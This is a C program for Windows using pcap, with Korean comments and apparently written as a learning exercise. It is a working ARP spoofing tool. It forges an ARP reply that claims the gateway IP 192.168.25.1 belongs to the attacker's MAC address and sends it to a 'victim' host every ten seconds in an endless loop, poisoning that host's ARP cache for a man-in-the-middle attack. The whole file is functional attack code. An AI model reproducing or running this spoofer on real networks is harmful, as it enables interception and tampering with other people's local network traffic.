#include <WinSock2.h>
//htons(), htonl() 함수 사용
#include <pcap.h>
//네트워크 프로그래밍 함수를 제공
//WinSock2.h는 항상 pcap.h보다 위에 있어야한다
#include <stdio.h>
#include <stdint.h>
//여러 자료형을 정리하여 제공
#include <string.h>


#pragma warning(disable:4996)
#pragma warning(disable:6011)

#define ETH_LEN 6
#define IP_LEN 4

#define ETHERTYPE_ARP 0x0806


//Wireshark를 참고하여 구조체를 만든다
#pragma pack(push, 1)
struct ether_header
{
	uint8_t dst_host[ETH_LEN];
	uint8_t src_host[ETH_LEN];
	uint16_t ether_type;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct arp_header {
	uint16_t hardware_type;
	uint16_t protocol_type;
	uint8_t hardware_size;
	uint8_t protocol_size;
	uint16_t opcode;
	uint8_t sender_host[ETH_LEN];
	uint8_t sender_ip[IP_LEN];
	uint8_t target_host[ETH_LEN];
	uint8_t target_ip[IP_LEN];
};
#pragma pack(pop)



int main(void)
{
	struct ether_header eth;
	struct arp_header arp;
	pcap_if_t* allDev;
	pcap_if_t* tempDev;
	char errbuf[PCAP_ERRBUF_SIZE];
	unsigned char packet[1500];
	pcap_t* _handle;


	int i = 0;
	int select;
	//모든 네트워크 장치를 가져오는 함수
	if (pcap_findalldevs(&allDev, errbuf) == PCAP_ERROR)
	{
		printf("[ERROR] pcap_findalldevs() : %s\n", errbuf);
		return NULL;
	}

	//장치는 연결리스트로 저장되어 있어 하나씩 불러와 화면에 출력
	for (tempDev = allDev; tempDev != NULL; tempDev = tempDev->next) {
		printf("%d. %s", ++i, tempDev->name);
		if (tempDev->description)
			printf(" (%s)\n", tempDev->description);
		else printf("No description available\n");
	}
	//장치 선택후 임시 장치를 가리키는 tempDev 포인터 이동

	printf("select interface number (1-%d) : ", i);
	scanf_s("%d", &select);
	if (select<1 || select>i) {
		printf("\nInterface number out of range.\n");
		pcap_freealldevs(allDev);
		return -1;
	}
	for (tempDev = allDev, i = 0; i < select - 1; tempDev = tempDev->next, i++);
	//선택된 장치의 핸들을 가져오는 함수, 핸들을 가져오고 모든 장치는 비활성화 해준다.

	if ((_handle = pcap_open_live(tempDev->name, 65536, 0, 1000, errbuf)) == NULL) {
		printf("  ");
		return -1;
	}
	/*	pcap_t* _handle = pcap_open(tempDev->name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 1000, NULL, errbuf);
	if (_handle == NULL) {
	printf("[ERROR] pcap_open() : %s\n", errbuf);
	return NULL;
	}
	pcap_freealldevs(allDev);
	return _handle;*/

	//패킷 버퍼 초기화
	memset(packet, 0, sizeof(packet));
	int length = 0;

	//Ethernet Header 구성
	//목적지
	eth.dst_host[0] = 0x00;
	eth.dst_host[1] = 0x0c;
	eth.dst_host[2] = 0x29;
	eth.dst_host[3] = 0x18;
	eth.dst_host[4] = 0x38;
	eth.dst_host[5] = 0x4b;
	//송신자
	eth.src_host[0] = 0x00;
	eth.src_host[1] = 0xe0;
	eth.src_host[2] = 0x4c;
	eth.src_host[3] = 0x61;
	eth.src_host[4] = 0xc8;
	eth.src_host[5] = 0x1f;

	eth.ether_type = htons(ETHERTYPE_ARP); //3계층의 프로토콜 지정

										   //패킷 버퍼에 저장
	memcpy(packet, &eth, sizeof(eth));
	length += sizeof(eth);

	//arp 헤더 구성
	arp.hardware_type = htons(0x0001);
	arp.protocol_type = htons(0x0800);
	arp.hardware_size = 0x06;
	arp.protocol_size = 0x04;
	arp.opcode = htons(0x0002);

	//공격자 MAC
	arp.sender_host[0] = 0x00;
	arp.sender_host[1] = 0xe0;
	arp.sender_host[2] = 0x4c;
	arp.sender_host[3] = 0x61;
	arp.sender_host[4] = 0xc8;
	arp.sender_host[5] = 0x1f;

	//공격자 IP(게이트웨이 IP)
	arp.sender_ip[0] = 192;
	arp.sender_ip[1] = 168;
	arp.sender_ip[2] = 25;
	arp.sender_ip[3] = 1;


	//피해자 MAC
	arp.target_host[0] = 0x00;
	arp.target_host[1] = 0x0c;
	arp.target_host[2] = 0x29;
	arp.target_host[3] = 0x18;
	arp.target_host[4] = 0x38;
	arp.target_host[5] = 0x4b;

	//피해자 IP
	arp.target_ip[0] = 192;
	arp.target_ip[1] = 168;
	arp.target_ip[2] = 25;
	arp.target_ip[3] = 16;

	//arp 역시 패킷 버퍼에 저장해주깅
	memcpy(packet + length, &arp, sizeof(arp));
	length += sizeof(arp);

	if (length < 64) {
		for (i = length; i < 64; i++) {
			packet[i] = 0;
		}
	}
	if (_handle == NULL) {
		printf("[ERROR] get_pcap_handle()\n");
		return -1;
	}

	//패킷 전송하는 부분
	//make_arp_reply(packet, &length);

	while (1)
	{
		if (pcap_sendpacket(_handle, packet, length) != 0)
		{
			printf("SEND PACKET ERROR!\n");
		
		}
		printf("VICTIM_ARP\n");
		Sleep(10000);
	}
	return 0;
}
